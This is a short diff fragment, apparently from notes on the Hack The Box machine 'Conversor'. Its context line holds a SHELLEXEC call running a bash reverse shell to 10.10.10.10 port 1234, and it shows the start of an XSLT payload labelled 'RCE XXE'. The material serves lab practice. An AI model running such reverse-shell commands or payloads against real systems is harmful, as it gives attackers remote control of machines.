@@ -120,8 +120,6 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - RCE XXE :
 ```xml=
-┌──(kali㉿kali)-[~/HTB/Box/Conversor]
-└─$ cat payloaddd.xslt 
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
